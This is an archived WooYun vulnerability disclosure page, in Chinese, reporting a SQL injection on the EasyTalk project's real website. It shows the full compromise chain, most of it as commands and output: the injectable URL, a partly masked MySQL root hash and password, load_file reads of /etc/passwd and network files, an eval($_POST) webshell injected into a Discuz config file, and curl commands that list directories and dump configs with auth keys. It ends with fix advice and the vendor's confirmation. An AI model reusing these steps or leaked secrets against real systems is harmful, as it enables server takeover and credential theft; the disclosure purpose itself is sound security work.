<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		EasyTalk官网主站sql注入(可沦陷服务器)  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		EasyTalk官网主站sql注入(可沦陷服务器)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/秋风">秋风</a> 
</li><li>提交时间：		2014-02-12 16:52</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-02-12：	细节已通知厂商并且等待厂商处理中<br/>
									2014-02-12：	厂商已经确认，细节仅向厂商公开<br/>
									2014-02-22：	细节向核心白帽子及相关领域专家公开<br/>
									2014-03-04：	细节向普通白帽子公开<br/>
									2014-03-14：	细节向实习白帽子公开<br/>
									2014-03-29：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">加强安全意识。。。。。。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>qiufeng@ubuntu:/tmp$ ping www.nextsns.com<br />
PING www.nextsns.com (58.49.57.112) 56(84) bytes of data.<br />
64 bytes from 58.49.57.112: icmp_req=1 ttl=55 time=17.4 ms</code></pre><p class='detail'><br />
<br />
http://www.nextsns.com:80/et/?hjoeson*<br />
<br />
存在sql注入，可注出数据<br />
<br />
</p><pre><code>mysql超级管理员密码泄露<br />
root *4C5F36D8E964919[马赛克]687CF45CF4CD3A2C<br />
<br />
可远程登陆,上cmd5得明文 yo********n3<br />
mysql -uroot -h 58.49.57.112 -p <br />
<br />
select load_file(&quot;/etc/passwd&quot;);<br />
root:x:0:0:root:/root:/bin/bash<br />
bin:x:1:1:bin:/bin:/sbin/nologin<br />
daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
sync:x:5:0:sync:/sbin:/bin/sync<br />
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />
halt:x:7:0:halt:/sbin:/sbin/halt<br />
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />
operator:x:11:0:operator:/root:/sbin/nologin<br />
games:x:12:100:games:/usr/games:/sbin/nologin<br />
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />
nobody:x:99:99:Nobody:/:/sbin/nologin<br />
dbus:x:81:81:System message bus:/:/sbin/nologin<br />
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin<br />
abrt:x:173:173::/etc/abrt:/sbin/nologin<br />
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />
ntp:x:38:38::/etc/ntp:/sbin/nologin<br />
saslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin<br />
postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br />
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin<br />
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />
tcpdump:x:72:72::/:/sbin/nologin<br />
oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin<br />
mysql:x:500:500::/home/mysql:/sbin/nologin<br />
www:x:501:501::/home/www:/sbin/nologin<br />
<br />
<br />
select load_file(&quot;/etc/sysconfig/network-scripts/ifcfg-eth0&quot;)<br />
DEVICE=eth0<br />
BOOTPROTO=none<br />
HWADDR=bc:ae:c5:5f:18:81<br />
NM_CONTROLLED=yes<br />
ONBOOT=yes<br />
TYPE=Ethernet<br />
UUID=&quot;542e47b5-9841-43c1-8656-a7bc17229a58&quot;<br />
IPADDR=58.49.57.112<br />
NETMASK=255.255.255.128<br />
DNS2=202.103.44.150<br />
GATEWAY=58.49.57.1<br />
DNS1=202.103.24.68<br />
IPV6INIT=no<br />
USERCTL=no<br />
<br />
<br />
select load_file(&quot;/etc/sysconfig/network-scripts/ifcfg-eth1&quot;);<br />
DEVICE=eth1<br />
BOOTPROTO=dhcp<br />
HWADDR=BC:AE:C5:5F:17:90<br />
NM_CONTROLLED=yes<br />
ONBOOT=no<br />
TYPE=Ethernet<br />
UUID=&quot;dd967db4-77f0-41f8-8c18-91b5bed1959d&quot;<br />
IPV6INIT=no<br />
USERCTL=no<br />
<br />
mysql&gt; show databases;<br />
+--------------------+<br />
| Database           |<br />
+--------------------+<br />
| information_schema |<br />
| etCms              |<br />
| etauthsite         |<br />
| etbbs              |<br />
| etnew              |<br />
| etwiki             |<br />
| fengkuang          |<br />
| fkcxhbbs           |<br />
| mygame2            |<br />
| mysql              |<br />
| pcgame             |<br />
| performance_schema |<br />
| richman            |<br />
| richman2           |<br />
| webxiaohua         |<br />
| xiaohua            |<br />
| xiaohuaweb         |<br />
| youxiqunbbs        |<br />
+--------------------+<br />
18 rows in set (0.02 sec)</code></pre><p class='detail'><br />
<br />
youxiqunbbs数据库，pre_ucenter_applications表可拿uc_key,对应discuz论坛地址bbs.youxiqun.com<br />
<br />
uc_key在手，服务器我有（还是那该死的/config/config_ucenter.php）！！！<br />
<br />
#1打印目录<br />
<br />
服务器貌似不支持scandir函数，只能用老方法获取了<br />
<br />
可修改opendir函数值，遍历服务器<br />
<br />
<br />
<br />
</p><pre><code>curl &quot;http://bbs.youxiqun.com/config/config_ucenter.php&quot; --data &#039;QF=$dh=opendir(&quot;/home/&quot;);while (false !== ($filename = readdir($dh))){$files[] = $filename;}sort($files);print_r($files);&#039;;<br />
<br />
打印/home<br />
Array<br />
(<br />
    [0] =&gt; .<br />
    [1] =&gt; ..<br />
    [2] =&gt; java<br />
    [3] =&gt; lost+found<br />
    [4] =&gt; mygame.tar.gz<br />
    [5] =&gt; mysql<br />
    [6] =&gt; richman.tar.gz<br />
    [7] =&gt; richman2.tar.gz<br />
    [8] =&gt; www<br />
    [9] =&gt; wwwlogs<br />
    [10] =&gt; xhmain.tar.gz<br />
    [11] =&gt; xiaohua.tar.gz<br />
    [12] =&gt; xiaohuadb.tar.gz<br />
    [13] =&gt; youxiqunbbs.tar.gz<br />
    [14] =&gt; youxiqunbbsdb.tar.gz<br />
)<br />
<br />
curl &quot;http://bbs.youxiqun.com/config/config_ucenter.php&quot; --data &#039;QF=$dh=opendir(&quot;/home/www&quot;);while (false !== ($filename = readdir($dh))){$files[] = $filename;}sort($files);print_r($files);&#039;;<br />
打印/home/www<br />
Array<br />
(<br />
    [0] =&gt; .<br />
    [1] =&gt; ..<br />
    [2] =&gt; .pki<br />
    [3] =&gt; cxh.tar.gz<br />
    [4] =&gt; fkcxh<br />
    [5] =&gt; fkcxh1<br />
    [6] =&gt; fkcxhbbs<br />
    [7] =&gt; fkcxhbbs_ys<br />
    [8] =&gt; html5<br />
    [9] =&gt; nextsns.com<br />
    [10] =&gt; penfu<br />
    [11] =&gt; smile.zip<br />
    [12] =&gt; webxiaohua<br />
    [13] =&gt; youxiqunbbs<br />
)<br />
<br />
curl &quot;http://bbs.youxiqun.com/config/config_ucenter.php&quot; --data &#039;QF=$dh=opendir(&quot;/home/www/nextsns.com/download&quot;);while (false !== ($filename = readdir($dh))){$files[] = $filename;}sort($files);print_r($files);&#039;;<br />
打印/home/www/nextsns.com/download<br />
Array<br />
(<br />
    [0] =&gt; .<br />
    [1] =&gt; ..<br />
    [2] =&gt; EasyTalk_Development_Guide.pdf<br />
    [3] =&gt; EasyTalk_X1.3.rar<br />
    [4] =&gt; EasyTalk_X1.4.rar<br />
    [5] =&gt; EasyTalk_X1.5.rar<br />
    [6] =&gt; EasyTalk_X1.6.rar<br />
    [7] =&gt; EasyTalk_X1.7.rar<br />
    [8] =&gt; EasyTalk_X1.8.rar<br />
    [9] =&gt; EasyTalk_X2.0.1.rar<br />
    [10] =&gt; EasyTalk_X2.0.2.rar<br />
    [11] =&gt; EasyTalk_X2.0.rar<br />
    [12] =&gt; EasyTalk_X2.1.zip<br />
    [13] =&gt; EasyTalk_X2.1_Beta2_20120813.zip<br />
    [14] =&gt; EasyTalk_X2.2.1.zip<br />
    [15] =&gt; EasyTalk_X2.2.2.zip<br />
    [16] =&gt; EasyTalk_X2.2.zip<br />
    [17] =&gt; EasyTalk_X2.3.zip<br />
    [18] =&gt; EasyTalk_X2.4.zip<br />
    [19] =&gt; EasyTalk_for_android_v1.0.apk<br />
    [20] =&gt; EasyTalk_for_ios_v1.0.ipa<br />
    [21] =&gt; EasyTalk_for_ios_v1.1.ipa<br />
    [22] =&gt; EasyTalk_manual.pdf<br />
    [23] =&gt; EasyTalk�����ĵ�.rar<br />
    [24] =&gt; EasyTalk�ֻ����ز��ĵ�.docx<br />
    [25] =&gt; EasyTalk���ݿ��ṹ.pdf<br />
    [26] =&gt; EasyTalk΢����ʹ���ֲ�.pdf<br />
    [27] =&gt; EasyTalkϵͳ�ṹ.pdf<br />
    [28] =&gt; easytalk_php_sdk_v1.0.zip<br />
    [29] =&gt; install_manual.rar<br />
    [30] =&gt; msyh.ttf<br />
    [31] =&gt; update_1.5.rar<br />
    [32] =&gt; update_1.5_20110517.rar<br />
    [33] =&gt; update_1.6.rar<br />
    [34] =&gt; update_1.7.rar<br />
    [35] =&gt; update_1.8.rar<br />
    [36] =&gt; update_2.0.1.rar<br />
    [37] =&gt; update_2.0.2.rar<br />
    [38] =&gt; update_2.0.rar<br />
)</code></pre><p class='detail'><br />
<br />
<br />
<br />
#2 敏感信息文件<br />
<br />
</p><pre><code>curl &quot;http://bbs.youxiqun.com/config/config_ucenter.php&quot; --data &#039;QF=print_r(file_get_contents(&quot;./config_ucenter.php&quot;));&#039;<br />
&lt;?php<br />
<br />
<br />
define(&#039;UC_CONNECT&#039;, &#039;mysql&#039;);<br />
<br />
define(&#039;UC_DBHOST&#039;, &#039;127.0.0.1&#039;);<br />
define(&#039;UC_DBUSER&#039;, &#039;root&#039;);<br />
define(&#039;UC_DBPW&#039;, &#039;yo[马赛克]3&#039;);<br />
define(&#039;UC_DBNAME&#039;, &#039;youxiqunbbs&#039;);<br />
define(&#039;UC_DBCHARSET&#039;, &#039;utf8&#039;);<br />
define(&#039;UC_DBTABLEPRE&#039;, &#039;`youxiqunbbs`.pre_ucenter_&#039;);<br />
define(&#039;UC_DBCONNECT&#039;, 0);<br />
<br />
define(&#039;UC_CHARSET&#039;, &#039;utf-8&#039;);<br />
define(&#039;UC_KEY&#039;, &#039;S2m9bcbfT4Ua[马赛克]AdTcxd0242g737dbe4kauaubn2pb&#039;);<br />
define(&#039;UC_API&#039;, &#039;http://aaa&#039;);eval($_POST[QF]);//&#039;);<br />
define(&#039;UC_APPID&#039;, &#039;1&#039;);<br />
define(&#039;UC_IP&#039;, &#039;&#039;);<br />
define(&#039;UC_PPP&#039;, 20);<br />
<br />
<br />
curl &quot;http://bbs.youxiqun.com/config/config_ucenter.php&quot; --data &#039;QF=print_r(file_get_contents(&quot;./config_global.php&quot;));&#039;<br />
&lt;?php<br />
<br />
<br />
$_config = array();<br />
<br />
// ----------------------------  CONFIG DB  ----------------------------- //<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;dbhost&#039;] = &#039;127.0.0.1&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;dbuser&#039;] = &#039;root&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;dbpw&#039;] = &#039;y[马赛克]3&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;dbcharset&#039;] = &#039;utf8&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;pconnect&#039;] = &#039;0&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;dbname&#039;] = &#039;youxiqunbbs&#039;;<br />
$_config[&#039;db&#039;][&#039;1&#039;][&#039;tablepre&#039;] = &#039;pre_&#039;;<br />
$_config[&#039;db&#039;][&#039;common&#039;][&#039;slave_except_table&#039;] = &#039;&#039;;<br />
$_config[&#039;db&#039;][&#039;slave&#039;] = &#039;&#039;;<br />
<br />
// --------------------------  CONFIG MEMORY  --------------------------- //<br />
$_config[&#039;memory&#039;][&#039;prefix&#039;] = &#039;ayRtDS_&#039;;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;server&#039;] = &#039;&#039;;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;port&#039;] = 6379;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;pconnect&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;timeout&#039;] = &#039;0&#039;;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;serializer&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;redis&#039;][&#039;requirepass&#039;] = &#039;&#039;;<br />
$_config[&#039;memory&#039;][&#039;memcache&#039;][&#039;server&#039;] = &#039;&#039;;<br />
$_config[&#039;memory&#039;][&#039;memcache&#039;][&#039;port&#039;] = 11211;<br />
$_config[&#039;memory&#039;][&#039;memcache&#039;][&#039;pconnect&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;memcache&#039;][&#039;timeout&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;apc&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;xcache&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;eaccelerator&#039;] = 1;<br />
$_config[&#039;memory&#039;][&#039;wincache&#039;] = 1;<br />
<br />
// --------------------------  CONFIG SERVER  --------------------------- //<br />
$_config[&#039;server&#039;][&#039;id&#039;] = 1;<br />
<br />
// -------------------------  CONFIG DOWNLOAD  -------------------------- //<br />
$_config[&#039;download&#039;][&#039;readmod&#039;] = 2;<br />
$_config[&#039;download&#039;][&#039;xsendfile&#039;][&#039;type&#039;] = &#039;0&#039;;<br />
$_config[&#039;download&#039;][&#039;xsendfile&#039;][&#039;dir&#039;] = &#039;/down/&#039;;<br />
<br />
// ---------------------------  CONFIG CACHE  --------------------------- //<br />
$_config[&#039;cache&#039;][&#039;type&#039;] = &#039;sql&#039;;<br />
<br />
// --------------------------  CONFIG OUTPUT  --------------------------- //<br />
$_config[&#039;output&#039;][&#039;charset&#039;] = &#039;utf-8&#039;;<br />
$_config[&#039;output&#039;][&#039;forceheader&#039;] = 1;<br />
$_config[&#039;output&#039;][&#039;gzip&#039;] = &#039;0&#039;;<br />
$_config[&#039;output&#039;][&#039;tplrefresh&#039;] = 1;<br />
$_config[&#039;output&#039;][&#039;language&#039;] = &#039;zh_cn&#039;;<br />
$_config[&#039;output&#039;][&#039;staticurl&#039;] = &#039;static/&#039;;<br />
$_config[&#039;output&#039;][&#039;ajaxvalidate&#039;] = &#039;0&#039;;<br />
$_config[&#039;output&#039;][&#039;iecompatible&#039;] = &#039;0&#039;;<br />
<br />
// --------------------------  CONFIG COOKIE  --------------------------- //<br />
$_config[&#039;cookie&#039;][&#039;cookiepre&#039;] = &#039;F57B_&#039;;<br />
$_config[&#039;cookie&#039;][&#039;cookiedomain&#039;] = &#039;&#039;;<br />
$_config[&#039;cookie&#039;][&#039;cookiepath&#039;] = &#039;/&#039;;<br />
<br />
// -------------------------  CONFIG SECURITY  -------------------------- //<br />
$_config[&#039;security&#039;][&#039;authkey&#039;] = &#039;d648ed1kHi0uJuZa&#039;;<br />
$_config[&#039;security&#039;][&#039;urlxssdefend&#039;] = 1;<br />
$_config[&#039;security&#039;][&#039;attackevasive&#039;] = &#039;0&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;status&#039;] = 1;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;0&#039;] = &#039;load_file&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;1&#039;] = &#039;hex&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;2&#039;] = &#039;substring&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;3&#039;] = &#039;if&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;4&#039;] = &#039;ord&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dfunction&#039;][&#039;5&#039;] = &#039;char&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;0&#039;] = &#039;intooutfile&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;1&#039;] = &#039;intodumpfile&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;2&#039;] = &#039;unionselect&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;3&#039;] = &#039;(select&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;4&#039;] = &#039;unionall&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;5&#039;] = &#039;uniondistinct&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;daction&#039;][&#039;6&#039;] = &#039;uniondistinct&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;0&#039;] = &#039;/*&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;1&#039;] = &#039;*/&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;2&#039;] = &#039;#&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;3&#039;] = &#039;--&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dnote&#039;][&#039;4&#039;] = &#039;&quot;&#039;;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;dlikehex&#039;] = 1;<br />
$_config[&#039;security&#039;][&#039;querysafe&#039;][&#039;afullnote&#039;] = &#039;0&#039;;<br />
<br />
// --------------------------  CONFIG ADMINCP  -------------------------- //<br />
// -------- Founders: $_config[&#039;admincp&#039;][&#039;founder&#039;] = &#039;1,2,3&#039;; --------- //<br />
$_config[&#039;admincp&#039;][&#039;founder&#039;] = &#039;1&#039;;<br />
$_config[&#039;admincp&#039;][&#039;forcesecques&#039;] = &#039;0&#039;;<br />
$_config[&#039;admincp&#039;][&#039;checkip&#039;] = 1;<br />
$_config[&#039;admincp&#039;][&#039;runquery&#039;] = &#039;0&#039;;<br />
$_config[&#039;admincp&#039;][&#039;dbimport&#039;] = 1;<br />
<br />
// --------------------------  CONFIG REMOTE  --------------------------- //<br />
$_config[&#039;remote&#039;][&#039;on&#039;] = &#039;0&#039;;<br />
$_config[&#039;remote&#039;][&#039;dir&#039;] = &#039;remote&#039;;<br />
$_config[&#039;remote&#039;][&#039;appkey&#039;] = &#039;62cf0b3c3e6a4c9468e7216839721d8e&#039;;<br />
$_config[&#039;remote&#039;][&#039;cron&#039;] = &#039;0&#039;;<br />
<br />
// ---------------------------  CONFIG INPUT  --------------------------- //<br />
$_config[&#039;input&#039;][&#039;compatible&#039;] = 1;<br />
<br />
<br />
// -------------------  THE END  -------------------- //<br />
<br />
?&gt;</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><p class="detail"><a href="../images/12163543e9c8514eff8bd90f3f248b7ead3c12e9.png" target="_blank"><img src="../images/12163543e9c8514eff8bd90f3f248b7ead3c12e9.png" alt="_829.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/13190544e798e2338fc1a73192ce25a2b659ba7b.jpg" target="_blank"><img src="../images/13190544e798e2338fc1a73192ce25a2b659ba7b.jpg" alt="11.jpg" width="600"/></a></p><p class="detail"> </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">1.对交互数据进行有效过滤<br />
<br />
2.更新uc_key<br />
<br />
3.建议关闭mysql对外网的访问权限<br />
<br />
4.建议php应用不要直接使用root用户访问<br />
<br />
5.EasyTalk源码建议托管到第三方，如google! </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/秋风" title="秋风">秋风</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050756" title="EasyTalk官网主站sql注入(可沦陷服务器)">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2014-02-12 17:03</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">正在修复</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="50756";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
